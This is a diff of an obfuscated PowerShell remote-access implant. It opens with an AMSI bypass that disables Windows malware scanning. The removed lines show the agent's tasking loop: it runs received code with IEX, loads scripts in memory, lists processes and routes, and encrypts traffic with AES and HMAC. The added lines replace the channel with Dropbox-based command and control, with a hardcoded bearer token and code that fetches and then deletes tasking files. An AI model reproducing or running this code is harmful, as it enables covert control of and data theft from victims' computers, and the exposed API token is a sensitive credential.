@@ -3,625 +3,615 @@ ${A`S`SeMBly} = [Ref]."aSS`EMbLY".('Ge'+'tTyp'+'e').Invoke(('{0}m{1}{2}' -f ${W}
 ${fI`eld} = ${a`ssE`M`BlY}.('GetFiel'+'d').Invoke(('am{0}InitFailed' -f ${C}),('N'+'o'+'nPubli'+'c,Stat'+'i'+'c'))
 ${f`i`ELd}.('Se'+'tV'+'alue').Invoke(${nU`Ll},${tr`Ue})
 
- (("{24}{8}{31}{33}{25}{36}{26}{11}{18}{27}{32}{20}{6}{12}{7}{9}{1}{40}{42}{41}{29}{38}{10}{30}{39}{35}{21}{34}{0}{3}{22}{2}{16}{23}{4}{13}{5}{17}{14}{37}{28}{19}{15}" -f '(@{ (6hdpat6hd+6hdh6hd) = 0dU{_}.ELNfuCjMLlCjMNAmEELN; (6hdna6hd+6hdme6hd) = 0dU{_}.ELNnaCjMMEELN; (6hdis_6hd+6hdf6hd+6hdile6hd) = 0dU{trCjMUE} }) };
-                    &(6hdG6hd','+6hdepropert6hd+6hdy6hd) (6hdD6hd+6hdes6hd+6hdtination6hd) 0dU{_}.ELNdeSTinCjMATCjMionELN;
-                            0dU{oCjMUt} hmz &(6hdAdd-6hd+6hdM6hd+6hdem6hd+6hdber6hd) (6hdNot6hd+6hdep6hd+6hdroperty6hd) (6hdNe6hd+6hdtmas6hd+6hdk6hd) 0dU{_}.ELNMCjMAsKELN;
-                            if (0dU{_}.ELNNexCjMThOPELN -eq (6hd0.06hd+6hd.06hd+6hd.06hd)) {
-                                0dU{oCjMUt} hmz &(6hdA6hd+6hddd-6hd+6hdMemb6hd+6hder6hd) (6hdN6hd+6hdo6hd+6hdteproperty6hd) (6hdNextHo6hd+6hdp6hd) (6hdOn-lin6hd+6hdk6hd);
-                            }
-                            else{
-                                0dU{OCjMUT} hmz &(6hdA6hd+6hddd-6hd+6hdMember6hd) (6hdNot6hd+6hdepro6hd+6hdper6hd+6hdty6hd) (6hdNextHo6hd+6hdp6hd) 0dU{_}.ELNNCjMexTCjMhOPELN;
-                            }
-                            if(0dU{aDCjMApCjMTers}[0dU{_}.ELNintCjMeRfaCEiNCjMDExELN] -and (0dU{ADApTCjMeRs}[0dU{_}.ELNiCjMNTerCjMFacEindExELN] -ne ELN','});
-                    0dU{StRCjMmproP} = 0dU{aSsCjMEm}.(6hdG6hd+6hdetTyp6hd+6hde6hd).Invoke((6hdTa6hd+6hdsk6hd)).(6hdGetP6hd+6hdro6hd+6hdperty6hd).Invoke((6hdOutput6hd+6hdStrea6hd+6hdm6hd));
-                    if(!0dU{StCjMRmPRCjMop}){
-                        0dU{RECjMsulTS} = 0dU{AsCjMsCjMem}.(6hdG6hd+6hdetTyp6hd+6hde6hd).Invoke((6hdTa6hd+6hdsk6hd)).(6hdGe6hd+6hdtMet6hd+6hdhod6hd).Invoke((6hdE6hd+6hdxecute6hd)).ELNinCjMVCjMOKeELN(0dU{NCjMUll}, 0dU{pCjMArCjMAMS});
-                    }
-                    else{
-                        0dU{pICjMpECjMSErVeRsTRCjMeCjMAm} = [System.IO.Pipes.AnonymousPipeServerStream]::ELNNCjMewELN([System.IO.Pipes.PipeDirection]::ELNInELN, [System.IO.Handle','+6hdet-ChildIte6hd+6hdm6hd) -force -Path 0dU{paCjMTH} -Attributes (6hddir6hd+6hdec6hd+6hdtory6hd) hmz &(6hdfo6hd+6hdreach6hd+6hd-6hd+6hdo6hd+6hdbject6hd) { 0dU{aRCjMRCjMAY} += (@{ (6hdp6hd+6hdath6hd) = 0dU{_}.ELNfUCjMllNAMEELN; (6hdn6hd+6hdame6hd) = 0dU{_}.ELNNACjMMeELN; (6hdis_fil6hd+6hde6hd) = 0dU{FCjMALSe} }) };
-                    0dU{dICjMRECjMCCjMTory} = &(6hdG6hd+6hdet-Item6hd) -force -Path 0dU{pACjMTH};
-                    0dU{oUtPCjMUt} = @{ (6hdd6hd+6hdirect6hd+6hdory_name6hd) = 0dU{DIRCjMEctOCjMRy}.ELNNCjMAMEELN; (6hddire6hd+6hdctory_pat6hd+6hdh6hd) = 0dU{DCjMiRECjMCTOrY}.ELNFCjMUCjMlLnamEELN; (6hditem6hd+6hds6hd) = 0dU{aCjMRrAy} } hmz &(6hdConv6hd+6hde6hd+6hdrtTo6hd+6hd-Js6hd+6hdon6hd) -Compress;
-                    if (0dU{dIReCjMcCjMToRY} -eq 0dU{nuCjMLl})
-                    {
-                        0dU{OuCjMTCjMPUt} = (6hdU6hd+6hdser6hd+6hd does not hav6hd+6hde access to6hd+6hd dir6hd+6hdect6hd+6hdory 6hd) + 0dU{PACjMTh};
-                    }
-                }
-                &(6hdE6hd+6hdn6hd+6hdcode-Packet6hd) -data 0dU{oUCjMTCjMpUt} -type 0dU{TCjMyPE} -ResultID 0dU{ReSuCjMLTCjMID};
+$Script:APIToken = "sl.B6Sjq3a2oMRT4YkFdIfMumRrfcASJBjPBH3KsiUxZCHS-Csw8RdZGcYGyTtPbCRJtYPzuEs2q5JXBqtpmwzoT_Pgi6CE9FhxGRdWqc3QpSbtKlfH_eQWmm55EyPHZFS4ofwiY7lG6IsB";
+
+$Script:GetTask = {
+        try {
+
+            $wc= New-Object System.Net.WebClient;
+
+
+            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+            if($Script:Proxy) {
+                $wc.Proxy = $Script:Proxy;
             }
-            elseif(0dU{TCjMypE} -eq 44){
-                try{
-                    0dU{PaCjMRCjMTS} = 0dU{daCjMTa}.(6hdsp6hd+6hdlit6hd).Invoke(ELN,ELN);
-                    0dU{pACjMRCjMAmS} = 0dU{PCjMARtS}[1..0dU{parCjMTS}.ELNlenCjMgCjMTHELN];
-                    0dU{byCjMTeS} = [System.Convert]::ELNfrCjMoMBASCjMe64sCjMTCjMRINgELN(0dU{ParCjMTS}[0]);
-                    0dU{mS} = &(6hdNew-O6hd+6hdbjec6hd+6hdt6hd) (6hdSy6hd+6hdst6hd+6hde6hd+6hdm.6hd+6hdIO.MemoryStre6hd+6hdam6hd);
-                    0dU{OUCjMTPUT} = &(6hdNew6hd+6hd-Obj6hd+6hdect6hd) (6hdS6hd+6hdy6hd+6hdst6hd+6hdem6hd+6hd.IO6hd+6hd.MemoryStream6hd);
-                    0dU{Ms}.(6hdW6hd+6hdrite6hd).Invoke(0dU{BCjMyTCjMEs}, 0, 0dU{bCjMyTCjMes}.ELNleNCjMGtHELN);
-                    0dU{MS}.(6hdSe6hd+6hdek6hd).Invoke(0,0) hmz &(6hdOu6hd+6hdt-Nu6hd+6hdll6hd);
-                    0dU{sr} = &(6hdNew6hd+6hd-Ob6hd+6hdject6hd) (6hdSyst6hd+6hdem6hd+6hd.IO.Compres6hd+6hdsion.Deflate6hd+6hdSt6hd+6hdream6hd)(0dU{mS}, [System.IO.Compression.CompressionMode]::ELNDeCCjMoMPCjMRESsELN);
-                    0dU{BuCjMFCjMFer} = [System.Byte[]]::ELNCrECjMAtCjMEiNStCjMANCEELN([System.Byte],4096);
-                    0dU{bYCjMTCjMeSreaD} = 0dU{Sr}.(6hdRe6hd+6hdad6hd).Invoke(0dU{BCjMUCjMFFEr}, 0, 0dU{BuCjMFFEr}.ELNLEnGCjMThELN);
-                    while(0dU{bYtCjMEsrCjMeAD} -ne 0){
-                        0dU{OCjMUTpuT}.(6hdW6hd+6hdrite6hd).Invoke(0dU{BuCjMFfCjMEr},0,0dU{bCjMyCjMTESCjMREAd});
-                        0dU{BYtesrCjMECjMAD} = 0dU{Sr}.(6hdRe6hd+6hdad6hd).Invoke(0dU{bufCjMFer}, 0, 0dU{bUfCjMFer}.ELNlCjMEngTHELN);
-                    }
-                    0dU{ASSeMCjMBytCjMes} = 0dU{OUCjMTpCjMUT}.(6hdToArr6hd+6hday6hd).Invoke();
-                    0dU{aSCjM','jMTiD};
+
+            $wc.Headers.Add("User-Agent", $Script:UserAgent);
+            $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)};
+
+            $TaskingsFolder = '/filmes/atividades';
+            $wc.Headers.Set("Authorization", "Bearer $($Script:APIToken)");
+            $wc.Headers.Set("Dropbox-API-Arg", "{`"path`":`"$TaskingsFolder/$($Script:SessionID).txt`"}");
+            $Data = $wc.DownloadData("https://content.dropboxapi.com/2/files/download");
+
+            if($Data -and ($Data.Length -ne 0)) {
+
+                $wc.Headers.Add("Content-Type", " application/json");
+                $wc.Headers.Remove("Dropbox-API-Arg");
+                $Null=$wc.UploadString("https://api.dropboxapi.com/2/files/delete_v2", "POST", "{`"path`":`"$TaskingsFolder/$($Script:SessionID).txt`"}");
+                $Data;
             }
-            elseif(0dU{TCjMypE} -eq 61) {
-                &(6hdEncod6hd+6hde-6hd+6hdPa6hd+6hdcket6hd) -type 0 -data (6hd[!] SOCK6hd+6hdS server da6hd+6hdt6hd+6hda no6hd+6hdt6hd+6hd impl6hd+6hdement6hd+6hded6hd) -ResultID 0dU{RCjMEsultCjMiD};
-            }
-            elseif(0dU{TYCjMpe} -eq 100 -or 0dU{TyCjMpE} -eq 118) {
-                0dU{rESCjMU','CjMid};
-            }
-            else{
-                &(6hdEncode-P6hd+6hdack6hd+6hdet6hd) -type 0 -data (6hd[6hd+6hd!] 6hd+6hdi6hd+6hdnvali6hd+6hdd 6hd+6hdt6hd+6hdype6hd+6hd: 6hd+ELN0dUtypeELN) -ResultID 0dU{REsUCjMlCjMTID};
-            }
+            $Script:MissedCheckins = 0;
         }
-        catch [System.Exception] {
-            &(6hdE6hd+6hdn6hd+6hdcode-P6hd+6hdacket6hd) -type 0dU{TYCjMpe} -data (6hd[!6hd+6hd] 6hd+6hderror6hd+6hd 6hd+6hdru6hd+6hdnnin6hd+6hdg 6hd+6hdcommand:6hd+6hd 6hd+ELN0dU_ELN) -ResultID 0dU{reCjMsuCjMLtid};
-        }
-    }
-    function pRocEsS-tasCjMkiNGPAcCjMkCjMeTs {
-        param(0dU{tCjMASkCjMiNG})
-        0dU{TAskINGbCjMyCjMTCjMES} = &(6hdD6hd+6hdecr6hd+6hdypt-B6hd+6hdytes6hd) 0dU{tCjMASCjMKIng};
-        if (-not 0dU{TAskCjMINgBCjMyteS}) {
-            return;
-        }
-        0dU{DCjMECodEd} = &(6hdDec6hd+6hdode-6hd+6hdP6hd+6hdacket6hd) 0dU{TAsKCjMiNCjMgbYCjMTEs};
-        0dU{TYCjMPe} = 0dU{decCjMOCjMded}[0];
-        0dU{ToTALCjMPCjMAcCjMkETs} = 0dU{DeCCjMODeD}[1];
-        0dU{PaCCjMkETCjMNUM} = 0dU{dECjMcCjMoDeD}[2];
-        0dU{taCjMSkID} = 0dU{DeCjMCOCjMdEd}[3];
-        0dU{lECjMNGCjMTH} = 0dU{DCjMECCjModed}[4];
-        0dU{DCjMAta} = 0dU{deCCjMoCjMdED}[5];
-        0d','ARCjMgs} }
-                    else{ 0dU{p} = ELN*ELN };
-                    0dU{oUCjMTpCjMUT} = &(6hdGe6hd+6hdt-Proce6hd+6hds6hd+6hds6hd) 0dU{p} hmz &(6hdF6hd+6hdor6hd+6hdEach-Obj6hd+6hdect6hd) {
-                        0dU{aRCjMCH} = (6hdx66hd+6hd46hd);
-                        if ([System.IntPtr]::ELNsCjMIzeELN -eq 4) {
-                            0dU{aRCjMcH} = (6hdx86hd+6hd66hd)
-                        }
-                        else{
-                            foreach(0dU{MoCjMdULe} in 0dU{_}.ELNMoDuCjMlCjMESELN) {
-                                if([System.IO.Path]::(6hdGetFil6hd+6hdeN6hd+6hdame6hd).Invoke(0dU{mOCjMdule}.ELNfILCjMEnCjMAmEELN).(6hdToL6hd+6hdow6hd+6hder6hd).Invoke() -eq (6hdwow6hd+6hd66hd+6hd4.dll6hd)) {
-                                    0dU{arCjMCH} = (6hdx6hd+6hd866hd);
-                                    break
-                                }
-                            }
-                        }
-                        0dU{oCjMUt} = &(6hdN6hd+6hdew6hd+6hd-Obje6hd+6hdct6hd) (6hdpso6hd+6hdbject6hd);
-                        0dU{OCjMUT} hmz &(6hdAd6hd+6hdd-6hd+','CjMUT} hmz &(6hdAdd6hd+6hd-Me6hd+6hdmber6hd) (6hdNo6hd+6hdteprop6hd+6hderty6hd) (6hdArc6hd+6hdh6hd) 0dU{aCjMRcH};
-                        0dU{OCjMUt} hmz &(6hdAd6hd+6hdd-Memb6hd+6hder6hd) (6hdN6hd+6hdotepro6hd+6hdperty6hd) (6hdUser6hd+6hdN6hd+6hdame6hd) 0dU{OCjMWCjMNerS}[0dU{_}.ELNIDELN.(6hdtostr6hd+6hdin6hd+6hdg6hd).Invoke()];
-                        0dU{MCjMEM} = ELN{0:N2} MBELN -f 0dU(0dU{_}.ELNwCjMSELN/1MB);
-                        0dU{OCjMUT} hmz &(6hdAdd-6hd+6hdMemb6hd+6hder6hd) (6hdNote6hd+6hdpro6hd+6hdper6hd+6hdty6hd) (6hdMemU6hd+6hds6hd+6hdage6hd) 0dU{mCjMEM};
-                        0dU{OCjMUt};
-                    } hmz &(6hdSor6hd+6hdt-Objec6hd+6hdt6hd) -Property (6hdPI6hd+6hdD6hd) hmz &(6hdConve6hd+6hdrtTo-6hd+6hdJ6hd+6hdso6hd+6hdn6hd);
-                }
-                (6hdg6hd+6hdetpid6hd) { 0dU{OuTpCjMUT} = [System.Diagnostics.Process]::(6hdG6hd+6hdetCur6hd+6hdre6hd+6hdntP6hd+6hdroces6hd+6hds6hd).Invoke() }
-                (6hdrout6hd+6hde6hd) {
-                    if ((0dU{cmdaCjMRCjMgs}.ELNLCjMeNgthELN -eq 6hd6hd) -or (0dU{cCjMmDARgS}.(6hdT6hd+6hdoLower6hd).Invoke() -eq (6hdp6hd+6hdrint6hd))) {
-                        0dU{ACjMdACjMpTeRs} = @{};
-                        &(6hdGet6hd+6hd-Wmi6hd+6hdO6hd+6hdbj6hd+6hdect6hd) (6hdWin32_Ne6hd+6hdtworkAdap6hd+6hdterC6hd+6hdonf6hd+6hdiguratio6hd+6hdn6hd) hmz &(6hdForEach-Obj6hd+6hdec6hd+6hdt6hd) { 0dU{aDCjMACjMPtERS}[[int](0dU{_}.ELNInTeCjMRfaceCjMInDEXELN)] = 0dU{_}.ELNIPCjMAdDCjMRessELN };
-                        0dU{oUTCjMpUt} = &(6hdG6hd+6hdet-W6hd+6hdmiObject6hd) (6hdw6hd+6hdin32_','401) {
-
-            &(6hdStart-Negot6hd+6hdi6hd+6hdat6hd+6hde6hd) -S ELN0dUScript:serverELN -SK 0dU{SCjMk} -UA 0dU{Ua};
-        }
-    }
-};
-function inCjMVOKe-CjMBOyO {
-    param(
-        [Parameter(mandatOry=0dU{TRCjMUE})]
-        [String]
-        0dU{sTCjMAGCjMinGKEy},
-        [Parameter(MANDATOrY=0dU{TRCjMUE})]
-        [String]
-        0dU{seCjMssIoNkCjMey},
-        [Parameter(mANDAtOrY=0dU{tCjMRUe})]
-        [String]
-        0dU{SEsCjMsiOCjMNId},
-        [Int32]
-        0dU{aCjMGentCjMdELaY} = 12,
-        [Double]
-        0dU{agCjMeNtjItTCjMER} = 0.0,
-        [String[]]
-        0dU{SCjMeRVeCjMRS},
-        [String]
-        0dU{kCjMiLlDACjMTe},
-        [Int32]
-        0dU{KCjMICjMLlDays},
- ','IP4Route6hd+6hdT6hd+6hdab6hd+6hdl6hd+6hde6hd) hmz &(6hdForEa6hd+6hdch-O6hd+6hdb6hd+6hdjec6hd+6hdt6hd) {
-                            0dU{OCjMUT} = &(6hdN6hd+6hdew-Obj6hd+6hdect6hd) (6hdps6hd+6hdobjec6hd+6hdt6hd);
-                            0dU{OCjMUt} hmz &(6hdAd6hd+6hdd-Membe6hd+6hdr6hd) (6hdNo6hd+6hdt6hd','aelMana6hd+6hdged6hd);
-        }
-        0dU{ACjMES}.ELNMOCjMDEELN = (6hdC6hd+6hdBC6hd);
-        0dU{ACjMeS}.ELNKCjMeyELN = 0dU{ENCOCjMdInG}.(6hdGetByt6hd+6hdes6hd).Invoke(0dU{sessIoCjMNCjMkCjMey});
-        0dU{ACjMES}.ELNIVELN = 0dU{iCjMV};
-        0dU{cCjMIpHerCjMTeXt} = 0dU{iV} + (0dU{aCjMeS}.(6hdC6hd+6hdreateE6hd+6hdnc6hd+6hdr6hd+6hdyptor6hd).Invoke()).(6hdTrans6hd+6hdfo6hd+6hdrm6hd+6hdFinalBlock6hd).Invoke(0dU{byCjMTES}, 0, 0dU{BCjMYCjMTeS}.ELNlEnGCjMThELN);
-        0dU{HCjMmAC}.ELNkCjMeyELN = 0dU{ENcCjMoCjMDinG}.(6hdG6hd+6hdet6hd+6hdBytes6hd).Invoke(0dU{seCjMssCjMIOnkey});
-        0dU{cICjMPheCjMRTexT} + 0dU{HMCjMAc}.ELNcoCjMMpUCjMTehashELN(0dU{cCjMiPHertCjMExt})[0..9];
-    }
-    function decCjMRYPCjMT-byTEs {
-        param (0dU{InCjMBYCjMTES})
-        if(0dU{INCjMByTes}.ELNleCjMNGTHELN -gt 32) {
-            0dU{mCjMAc} = 0dU{InCjMBytCjMes}[-10..-1];
-            0dU{inbYTCjMES} = 0dU{INCjMByTCjMeS}[0..(0dU{iCjMNCjMByTes}.ELNLCjMeNGCjMTHELN - 11)];
-            0dU{HCjMMaC}.ELNkCjMEYELN = 0dU{enCCjMODCjMICjMNg}.(6hdG6hd+6hdetByt6hd+6hdes6hd).Invoke(0dU{sCjMESsCjMIonKEY});
-            0dU{eXCjMpECjMctED} = 0dU{hCjMMac}.ELNcCjMomCjMPUteHasHELN(0dU{InBCjMyTEs})[0..9];
-            if (@(&(6hdCo6hd+6hdmpare-Ob6hd+6hdje6hd+6hdc6hd+6hdt6hd) 0dU{mCjMAC} 0dU{exCjMPeCTed} -sync 0).ELNlCjMeNgTHELN -ne 0) {
-                return;
-            }
-            0dU{iCjMV} = 0dU{inCjMBYCjMTeS}[0..15];
-            try {
-                0dU{aCjMES}=&(6hdNe6hd+6hdw-O6hd+6hdbject6hd) (6hdS6hd+6hdyst6hd+6hdem.Security.Cr6hd+6hdy6hd+6hdpto6hd+6hdgraphy.6hd+6hdAes6hd+6hdCry6hd+6hdptoServicePr6hd+6hdov6hd+6hdi6hd+6hdder6hd);
-            }
-            catch {
-                0dU{aCjMeS}=&(6hdNew-O6hd+6hdb6hd+6hdject6hd) (6hdSystem.6hd+6hdSecu6hd+6hdrit6hd+6hdy.Cr6hd+6hdy6hd+6hdp6hd+6hdtography.Ri6hd+6hdjn6hd+6hdd6hd+6hda',' (0dU{oCjMUTpCjMUT}.ELNLCjMENCjMGtHELN -eq 0){
-                    0dU{OutpCjMUt} = 0dU{sTrINCjMgwCjMRi','6hdM6hd+6hdember6hd) (6hdNote6hd+6hdprop6hd+6hdert6hd+6hdy6hd) (6hdP6hd+6hdroce6hd+6hdssName6hd) 0dU{_}.ELNPCjMROCECjMssNAMEELN;
-                        0dU{oCjMUt} hmz &(6hdAd6hd+6hdd6hd+6hd-Member6hd) (6hdNotep6hd+6hdrop6hd+6hderty6hd) (6hdP6hd+6hdID6hd) 0dU{_}.ELNIdELN;
-                        0dU{o','LCjMTDAtA} = &(6hdIE6hd+6hdX6hd) 0dU{daCjMTa};
-                if(0dU{resULtCjMDCjMAtA}) {
-                    &(6hdEnc6hd+6hdode-Pa6hd+6hdcket6hd) -type 0dU{tYCjMpe} -data 0dU{rECjMsulCjMTdatA} -ResultID 0dU{RECjMsUCjMLTid};
-                }
-            }
-            elseif(0dU{TCjMyPe} -eq 101 -or 0dU{TCjMyPE} -eq 119) {
-                0dU{pCjMREFix} = 0dU{dACjMTA}.(6hdS6hd+6hdubstring6hd).Invoke(0,15);
-                0dU{ExTCjMENCjMSCjMioN} = 0dU{dCjMAta}.(6hdSu6hd+6hdb6hd+6hdstrin6hd+6hdg6hd).Invoke(15,5);
-                0dU{daCjMTA} = 0dU{DCjMATA}.(6hdSu6hd+6hdbstring6hd).Invoke(20);
-                &(6hdEn6hd+6hdcode-Pa6hd+6hdck6hd+6hdet6hd) -type 0dU{TCjMYPe} -data (0dU{pREfCjMIX} + 0dU{ECjMXtECjMNSCjMIOn} + (&(6hdIE6hd+6hdX6hd) 0dU{dACjMTA})) -ResultID 0dU{ResCjMUlTCjMID};
-            }
-            elseif(0dU{TYCjMpe} -eq 110 -or 0dU{tYCjMPE} -eq 112) {
-                0dU{jObCjMid} = &(6hdStart-A6hd+6hdgen6hd+6hdtJob6hd) 0dU{DACjMTA};
-                0dU{sCjMcCjMRIpCjMTCjM:rEsUlTIDS}[0dU{jCjMObiD}]=0dU{rECjMsUlCjMTiD};
-                &(6hdEncod6hd+6hde-P6hd+6hda6hd+6hdcke6hd+6hdt6hd) -type 0dU{tCjMYPe} -data ((6hdJob st6hd+6hdar6hd+6hdted: 6hd) + 0dU{JOCjMBId}) -ResultID 0dU{ReSULCjMTCjMiD};
-            }
-            elseif(0dU{TyCjMPe} -eq 111 -or 0dU{TCjMypE} -eq 113) {
-                &(6hdE6hd+6hdn6hd+6hdc6hd+6hdode-Packet6hd) -type 0 -data (6hd[!] 6hd+6hdDy6hd+6hdnamic 6hd+6hdcod6hd+6hde e6hd+6hdxec6hd+6hdution, no wait,6hd+6hd s6hd+6hdave out6hd+6hdp6hd+6hdut not 6hd+6hdimpl6hd+6hde6hd+6hdmented6hd) -ResultID 0dU{RCjMEsUCjMLTiD};
-            }
-            elseif(0dU{tCjMYpe} -eq 120) {
-                0dU{ScCjMRCjMIPt:iCjMmpOrtEdCjMsCRiPt} = &(6hdEncry6hd+6hdpt6hd+6hd-B6hd+6hdyt6hd+6hdes6hd) 0dU{eCjMNcOCjMDICjMNG}.(6hdGetB6hd+6hdytes6hd).Invoke(0dU{DACjMTA});
-                &(6hdE6hd+6hdncode-Pack6hd+6hde6hd+6hdt6hd) -type 0dU{tYCjMpE} -data (6hds6hd+6hdcript s6hd+6hdu6hd+6hdccessfully6hd+6hd sa6hd+6hdved in 6hd+6hdmemory6hd) -ResultID 0dU{RCjMesCjMULCjMTId};
-            }
-            elseif(0dU{tCjMYpe} -eq 121) {
-                0dU{ScRiCjMpt} = &(6hdDec6hd+6hdrypt-B6hd+6hdytes6hd) 0dU{sCRCjMIPt:IMCjMPoCjMRTeDsCCjMRiPT};
-                if (0dU{sCjMcRiCjMpt}) {
-                    0dU{jCjMObCjMiD} = &(6hdStart6hd+6hd-6hd+6hdAgen6hd+6hdt6hd+6hdJob6hd) ([System.Text.Encoding]::ELNUCjMTF8ELN.ELNGECjMTSCjMTRingELN(0dU{sCjMCrICjMPT}) + (6hd; 6hd+ELN0dUdataELN));
-                    0dU{SCjMCrCjMIpt:reSULTCjMidS}[0dU{jobCjMId}]=0dU{rEsCjMUltCjMId};
-                    &(6hdEncode-P6hd+6hdac6hd+6hdk6hd+6hdet6hd) -type 0dU{TYCjMpe} -data ((6hdJ6hd+6hdob s6hd+6hdt6hd+6hdarted: 6hd) + 0dU{jobCjMiD}) -ResultID 0dU{rESuCjMLTID};
-                }
-            }
-            elseif(0dU{tCjMypE} -eq 130) {
-                try {
-                    &(6hdIE6hd+6hdX6hd) 0dU{dCjMATa}
-                    &(6hdEnc6hd+6hdo6hd+6hdde-Packet6hd) -type 0dU{tCjMYPE} -data (6hd[6hd+6hd+] 6hd+6hdS6hd+6hdwitched6hd+6hd 6hd+6hdthe6hd+6hd 6hd+6hdc6hd+6hdurre6hd+6hdnt 6hd+6hdlistene6hd+6hdr6hd+6hd 6hd+6hdto:6hd+6hd 6hd+ELN0dUCurrentListenerNameELN) -ResultID 0dU{resCjMUlCjMTId};
-                }
-                catch {
-                    &(6hdEncode-P6hd+6hda6hd+6hdcke6hd+6hdt6hd) -type 0 -data ((6hd[6hd+6hd!] 6hd+6hdUn6hd+6hdable 6hd+6hdt6hd+6hdo 6hd+6hdup6hd+6hddat6hd+6hde 6hd+6hda6hd+6hdgent6hd+6hd 6hd+6hdc6hd+6hdomm 6hd+6hdm6hd+6hdet6hd+6hdhods: 6hd+ELN0dU_ELN)) -ResultID 0dU{reSUCjMLCjMTiD};
-                }
-            }
-            elseif(0dU{TYCjMpe} -eq 131) {
-                0dU{scRCjMiCjMPT:CUrRENtLISCjMTeneRCjMNCjMAMe} = 0dU{DCjMAta};
-                &(6hdEn6hd+6hdcode6hd+6hd-Pa6hd+6hdcket6hd) -type 0dU{tYCjMPe} -data (6hd[+6hd+6hd] 6hd+6hdUpd6hd+6hdat6hd+6hded 6hd+6hdth6hd+6hde 6hd+6hdCurre6hd+6hdntLi6hd+6hdstenerName6hd+6hd 6hd+6hdt6hd+6hdo: 6hd+ELN0dUCurrentListenerNameELN) -ResultID 0dU{resCjMUlT','CjMgCjMThELN -ne 0) {
-            0dU{DCjMeCODEd} = &(6hdDecode-6hd+6hdP6hd+6hdac6hd+6hdket6hd) 0dU{TAskICjMNGBCjMYCjMTes} 0dU{OCjMFFSeT};
-            0dU{tyCjMpE} = 0dU{dECoCjMDCjMEd}[0];
-            0dU{TCjMOtalCjMPaCKCjMeCjMTS} = 0dU{dCjMeCjMCoded}[1];
-            0dU{paCjMcKECjMTnuM} = 0dU{dEcODCjMED}[2];
-            0dU{TACjMsCjMkID} = 0dU{dECjMCODeD}[3]','{cCjMUrCjMREnT} -le 0dU{ECjMND};
-            if ((-not 0dU{StarTCjMchECjMCK}) -or (-not 0dU{ECjMNDCjMCheCK})) {
-                0dU{sLCjMeEpsECOnCjMds} = (0dU{SCjMTaRt} - 0dU{CCjMUrrCjMENt}).ELNTCjMOtACjMlSEConCjMdSELN;
-                if(0dU{SCjMLeepSecCjMOCjMNdS} -lt 0) {
-                    0dU{sLECjMECjMpseCoCjMNds} = (0dU{sCjMTCjMART}.(6hda6hd+6hdd6hd+6hddDays6hd).Invoke(1) - 0dU{CURCjMRECjMNT}).ELNtoCjMTACjMlseCOCjMNDsELN;
-                }
-                &(6hdStart-S6hd+6hdlee6hd+6hdp6hd) -Seconds 0dU{sLCjMEePCjMsCjMEcoNdS};
-            }
-        }
-        if (0dU{scrICjMpT:ACjMgCjMeCjMNTdELCjMAy} -ne 0) {
-            0dU{sCjMLCjMEePMCjMiN} = [int]((1-0dU{sCjMCCjMRiPTCjM:AgenCjMTJICjMTter})*0dU{SCRIptCjM:aCjMGEnTCjMdeCjMLAY});
-            0dU{sCjMlEEPmCjMAx} = [int]((1+0dU{SCRiptCjM:ACjMGeCjMNTCjMjiTTer})*0dU{scrCjMipT:CjMAgeCjMNtdelaY});
-            if (0dU{SlEePCjMMiN} -eq 0dU{sCjMlCjMeepmAx}) {
-                0dU{sLCjMECjMEpTiMe} = 0dU{SCjMLECjMEPmiN};
-            }
-            else{
-                0dU{SCjMlECjMeptICjMMe} = &(6hdGet-R6hd+6hdand6hd+6hdom6hd) -Minimum 0dU{sCjMlEEpCjMmCjMin} -Maximum 0dU{SCjMlCjMeepMax};
-            }
-            &(6hdStar6hd+6hdt-Slee6hd+6hdp6hd) -Seconds 0dU{sLEEPCjMTCjMIME};
-        }
-        0dU{jOCjMBCjMResUCjMltS} = 0dU{nUCjMlL};
-        ForEach(0dU{JCjMoBNAmE} in 0dU{sCriCjMpt:jCjMOBS}.ELNkCjMEySELN) {
-            0dU{JoBRECjMsulCjMTid} = 0dU{ScCjMRCjMiCjMPT:reCjMSCjMUlTIDs}[0dU{JobCjMNAmE}];
-            if(&(6hdG6hd+6hde6hd+6hdt-AgentJo6hd+6hdb6hd+6hdCom6hd+6hdple6hd+6hdted6hd) -JobName 0dU{joBNCjMACjMMe}) {
-                0dU{rESuCjMLTS} = &(6hdStop-A6hd+6hdg6hd+6hdentJob6hd) -JobName 0dU{JCjMobNACjMME} hmz &(6hdfl6hd) hmz &(6hdOu6hd+6hdt6hd+6hd-String6hd);
-            }
-            else {
-                0dU{RECjMsUlTS} = &(6hdR6hd+6hdeceive6hd+6hd-6hd+6hdAgentJob6hd) -JobName 0dU{JOCjMBnaCjMME} hmz &(6hdfl6hd) hmz &(6hdO6hd+6hdut-6hd+6hdStrin6hd+6hdg6hd);
-            }
-            if(0dU{rCjMEsUCjMLTS}) {
-                0dU{JOBCjMResCjMULtS} += 0dU(&(6hdEn6hd+6hdc6hd+6hdode-6hd+6hdP6hd+6hdacket6hd) -type 110 -data 0dU(0dU{rCjMECjMsUlts}) -ResultID 0dU{jOCjMBCjMReCjMsultid});
-            }
-        }
-        if (0dU{JOBCjMRCjMECjMSuLTS}) {
-            ((& 0dU{sendmCjMeSCjMSACjMge} -Packets 0dU{jObReCjMsUlCjMTs}));
-        }
-        0dU{tACjMsCjMkDAta} = (& 0dU{GeCjMTTACjMsK});
-        if (0dU{tASCjMKdCjMAtA}) {
-            0dU{SCCjMRICjMpTCjM:mISSedCjMChECKCjMINS} = 0;
-            if ([System.Text.Encoding]::ELNUTCjMF8ELN.ELNGCjMeTSCjMTRingELN(0dU{TaSKDCjMACjMTA}) -ne 0dU{ScCjMRiCjMpt:deFAulCjMTCjMRECjMsponSe}) {
-                &(6hdDe6hd+6hdco6hd+6hdde6hd+6hd-Routin6hd+6hdgPa6hd+6hdcket6hd) -PacketData 0dU{TACjMsCjMKDAtA};
-            }
-        }
-        [GC]::(6hdColle6hd+6hdct6hd).Invoke();
-    }
-}
-
